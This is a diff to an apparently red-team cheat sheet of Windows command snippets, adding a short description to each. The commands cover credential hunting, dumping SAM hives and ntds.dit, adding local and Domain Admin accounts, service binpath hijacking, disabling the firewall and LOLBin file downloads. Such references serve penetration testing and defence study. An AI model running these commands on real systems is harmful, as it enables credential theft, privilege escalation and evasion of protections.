@@ -6,6 +6,8 @@
 
 Show system info with Windows.
 
+Print full Windows system information.
+
 ```cmd title:"Windows Show System Info"
 systeminfo
 ```
@@ -15,6 +17,8 @@ systeminfo
 
 Run hostname with Windows.
 
+Print hostname.
+
 ```cmd title:"Windows Run Hostname"
 hostname
 ```
@@ -23,6 +27,8 @@ hostname
 ### Computer name
 
 Run computer name with Windows.
+
+Print computer name from PowerShell.
 
 ```powershell title:"Windows Run Computer Name"
 $env:COMPUTERNAME
@@ -35,6 +41,8 @@ $env:COMPUTERNAME
 
 Find password strings with Windows.
 
+Search common document types for password strings.
+
 ```cmd title:"Windows Find Password Strings"
 findstr /si "password" *.txt *.xml *.docx
 ```
@@ -43,6 +51,8 @@ findstr /si "password" *.txt *.xml *.docx
 ### GPP cpassword
 
 Dump GPP cpassword with Windows.
+
+Search SYSVOL policies for Group Policy Preferences cpassword values.
 
 ```cmd title:"Windows Dump GPP Cpassword"
 findstr /S /I cpassword "\\$domain\sysvol\$domain\policies\*.xml"
@@ -55,6 +65,8 @@ var domain
 
 List recycle bin with Windows.
 
+Recursively list Recycle Bin contents.
+
 ```cmd title:"Windows List Recycle Bin"
 dir C:\$Recycle.Bin /s /b
 ```
@@ -63,6 +75,8 @@ dir C:\$Recycle.Bin /s /b
 ### Hidden files
 
 List hidden files with Windows.
+
+List hidden files in a path.
 
 ```cmd title:"Windows List Hidden Files"
 dir /a:h "$path"
@@ -75,6 +89,8 @@ var path
 
 List recursive list with Windows.
 
+Recursively list files by full path.
+
 ```cmd title:"Windows List Recursive List"
 dir /s /b
 ```
@@ -83,6 +99,8 @@ dir /s /b
 ### Hosts file
 
 Run hosts file with Windows.
+
+Print the Windows hosts file.
 
 ```cmd title:"Windows Run Hosts File"
 type C:\WINDOWS\System32\drivers\etc\hosts
@@ -95,6 +113,8 @@ type C:\WINDOWS\System32\drivers\etc\hosts
 
 List scheduled tasks with Windows.
 
+List scheduled tasks verbosely.
+
 ```cmd title:"Windows List Scheduled Tasks"
 schtasks /query /fo LIST /v
 ```
@@ -103,6 +123,8 @@ schtasks /query /fo LIST /v
 ### Find scheduled task
 
 Find scheduled task with Windows.
+
+Find a scheduled task by name.
 
 ```cmd title:"Windows Find Scheduled Task"
 schtasks /query /fo LIST 2>nul | findstr "$task_name"
@@ -115,6 +137,8 @@ var task_name
 
 List processes with Windows.
 
+List processes verbosely.
+
 ```cmd title:"Windows List Processes"
 tasklist /V
 ```
@@ -124,6 +148,8 @@ tasklist /V
 
 List processes with services with Windows.
 
+List processes and linked services.
+
 ```cmd title:"Windows List Processes with Services"
 tasklist /SVC
 ```
@@ -132,6 +158,8 @@ tasklist /SVC
 ### Service permissions
 
 Check service permissions with Windows.
+
+Check service permissions with accesschk.
 
 ```cmd title:"Windows Check Service Permissions"
 accesschk.exe /accepteula -ucqv "$service_name"
@@ -144,6 +172,8 @@ var service_name
 
 Enumerate reconfigure service command with Windows.
 
+Set a service binary path to a command.
+
 ```cmd title:"Windows Enumerate Reconfigure Service Command"
 sc config "$service_name" binpath= "$command"
 ```
@@ -155,6 +185,8 @@ var command
 ### Start service
 
 Start service with Windows.
+
+Start a service.
 
 ```cmd title:"Windows Start Service"
 net start "$service_name"
@@ -169,6 +201,8 @@ var service_name
 
 Enumerate winlogon with Windows.
 
+Query Winlogon registry values.
+
 ```cmd title:"Windows Enumerate Winlogon"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ```
@@ -177,6 +211,8 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ### HKLM password search
 
 Dump HKLM password search with Windows.
+
+Search HKLM registry strings for password.
 
 ```cmd title:"Windows Dump HKLM Password Search"
 reg query HKLM /f password /t REG_SZ /s
@@ -187,6 +223,8 @@ reg query HKLM /f password /t REG_SZ /s
 
 Dump HKCU password search with Windows.
 
+Search HKCU registry strings for password.
+
 ```cmd title:"Windows Dump HKCU Password Search"
 reg query HKCU /f password /t REG_SZ /s
 ```
@@ -195,6 +233,8 @@ reg query HKCU /f password /t REG_SZ /s
 ### Save hives
 
 Run save hives with Windows.
+
+Save SAM, SECURITY, and SYSTEM hives.
 
 ```cmd title:"Windows Run Save Hives"
 reg save HKLM\SAM C:\Windows\Temp\sam.save
@@ -209,6 +249,8 @@ reg save HKLM\SYSTEM C:\Windows\Temp\system.save
 
 Enumerate whoami privileges with Windows.
 
+Print current privileges.
+
 ```cmd title:"Windows Enumerate Whoami Privileges"
 whoami /priv
 ```
@@ -217,6 +259,8 @@ whoami /priv
 ### User info
 
 Show user info with Windows.
+
+Show local user information.
 
 ```cmd title:"Windows Show User Info"
 net user "$target_user"
@@ -228,6 +272,8 @@ var target_user
 ### Add local user
 
 Add local user with Windows.
+
+Create a local user.
 
 ```cmd title:"Windows Add Local User"
 net user "$target_user" "$target_pass" /ADD
@@ -241,6 +287,8 @@ var target_pass
 
 Add local admin with Windows.
 
+Add a user to local administrators.
+
 ```cmd title:"Windows Add Local Admin"
 net localgroup administrators "$target_user" /add
 ```
@@ -251,6 +299,8 @@ var target_user
 ### Runas
 
 Execute runas with Windows.
+
+Run cmd as another user.
 
 ```cmd title:"Windows Execute Runas"
 runas /user:$domain\$user cmd.exe
@@ -263,6 +313,8 @@ var user
 ### Local group members
 
 List local group members with Windows.
+
+List members of a local group.
 
 ```cmd title:"Windows List Local Group Members"
 net localgroup "$group_name"
@@ -277,6 +329,8 @@ var group_name
 
 Enumerate domain DNS with Windows.
 
+Query domain DNS records from `%USERDNSDOMAIN%`.
+
 ```cmd title:"Windows Enumerate Domain DNS"
 nslookup -type=any %USERDNSDOMAIN%.
 ```
@@ -285,6 +339,8 @@ nslookup -type=any %USERDNSDOMAIN%.
 ### Domain name
 
 Run domain name with Windows.
+
+Print NetBIOS domain.
 
 ```cmd title:"Windows Run Domain Name"
 echo %USERDOMAIN%
@@ -295,6 +351,8 @@ echo %USERDOMAIN%
 
 Run domain FQDN with Windows.
 
+Print DNS domain.
+
 ```cmd title:"Windows Run Domain FQDN"
 echo %USERDNSDOMAIN%
 ```
@@ -304,6 +362,8 @@ echo %USERDNSDOMAIN%
 
 Start logon server with Windows.
 
+Print logon server.
+
 ```cmd title:"Windows Start Logon Server"
 echo %LOGONSERVER%
 ```
@@ -312,6 +372,8 @@ echo %LOGONSERVER%
 ### Domain user info
 
 Show domain user info with Windows.
+
+Show domain user info.
 
 ```cmd title:"Windows Show Domain User Info"
 net user "$target_user" /domain
@@ -324,6 +386,8 @@ var target_user
 
 Add domain admin with Windows.
 
+Add a user to Domain Admins.
+
 ```cmd title:"Windows Add Domain Admin"
 net group "Domain Admins" "$target_user" /add /domain
 ```
@@ -334,6 +398,8 @@ var target_user
 ### Domain controllers
 
 List domain controllers with Windows.
+
+List domain controllers.
 
 ```cmd title:"Windows List Domain Controllers"
 nltest /dclist:$domain
@@ -346,6 +412,8 @@ var domain
 
 List domain trusts with Windows.
 
+List domain trust relationships.
+
 ```cmd title:"Windows List Domain Trusts"
 nltest /domain_trusts
 ```
@@ -354,6 +422,8 @@ nltest /domain_trusts
 ### Enable SID history
 
 Enable SID history with Windows.
+
+Enable SID history on a trust.
 
 ```cmd title:"Windows Enable SID History"
 netdom trust "$source_domain" /d:"$target_domain" /enablesidhistory:yes
@@ -369,6 +439,8 @@ var target_domain
 
 Run ARP cache with Windows.
 
+Print ARP cache.
+
 ```cmd title:"Windows Run ARP Cache"
 arp -a
 ```
@@ -377,6 +449,8 @@ arp -a
 ### Domain shares
 
 List domain shares with Windows.
+
+List domain shares.
 
 ```cmd title:"Windows List Domain Shares"
 net view /all /domain "$domain"
@@ -389,6 +463,8 @@ var domain
 
 List host shares with Windows.
 
+List shares on a host.
+
 ```cmd title:"Windows List Host Shares"
 net view "\\$rhost_name" /ALL
 ```
@@ -399,6 +475,8 @@ var rhost_name
 ### Mount share
 
 Mount share with Windows.
+
+Mount an SMB share to `x:`.
 
 ```cmd title:"Windows Mount Share"
 net use x: "\\$rhost_name\$share"
@@ -414,6 +492,8 @@ var share
 
 Show firewall state with Windows.
 
+Show firewall state.
+
 ```cmd title:"Windows Show Firewall State"
 netsh advfirewall show allprofiles
 ```
@@ -422,6 +502,8 @@ netsh advfirewall show allprofiles
 ### Firewall off
 
 Disable firewall off with Windows.
+
+Disable Windows Firewall for all profiles.
 
 ```cmd title:"Windows Disable Firewall Off"
 netsh advfirewall set allprofiles state off
@@ -432,6 +514,8 @@ netsh advfirewall set allprofiles state off
 
 Enable firewall on with Windows.
 
+Enable Windows Firewall for all profiles.
+
 ```cmd title:"Windows Enable Firewall on"
 netsh advfirewall set allprofiles state on
 ```
@@ -440,6 +524,8 @@ netsh advfirewall set allprofiles state on
 ### Open RDP
 
 Run open RDP with Windows.
+
+Open RDP on the firewall.
 
 ```cmd title:"Windows Run Open RDP"
 netsh firewall add portopening TCP 3389 "Remote Desktop"
@@ -452,6 +538,8 @@ netsh firewall add portopening TCP 3389 "Remote Desktop"
 
 Create shadow copy with Windows.
 
+Create a shadow copy for `C:`.
+
 ```cmd title:"Windows Create Shadow Copy"
 wmic shadowcopy call create Volume='C:\'
 ```
@@ -460,6 +548,8 @@ wmic shadowcopy call create Volume='C:\'
 ### List shadow copies
 
 List shadow copies with Windows.
+
+List volume shadow copies.
 
 ```cmd title:"Windows List Shadow Copies"
 vssadmin list shadows
@@ -470,6 +560,8 @@ vssadmin list shadows
 
 Dump IFM NTDS dump with Windows.
 
+Create an IFM copy of AD DS.
+
 ```cmd title:"Windows Dump IFM NTDS Dump"
 ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
 ```
@@ -478,6 +570,8 @@ ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
 ### Copy NTDS with VSS
 
 Copy NTDS with VSS with Windows.
+
+Copy `ntds.dit` via VSS.
 
 ```cmd title:"Windows Copy NTDS with VSS"
 esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
@@ -490,6 +584,8 @@ esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
 
 Download JScript download with Windows.
 
+Download a file with WinHttpRequest through cscript.
+
 ```cmd title:"Windows Download JScript Download"
 echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js "$url" > "$output_file"
 ```
@@ -501,6 +597,8 @@ var output_file
 ### Defender download
 
 Download defender download with Windows.
+
+Download a file with MpCmdRun.
 
 ```cmd title:"Windows Download Defender Download"
 mpcmdrun.exe -DownloadFile -url "$url" -path "$output_file"
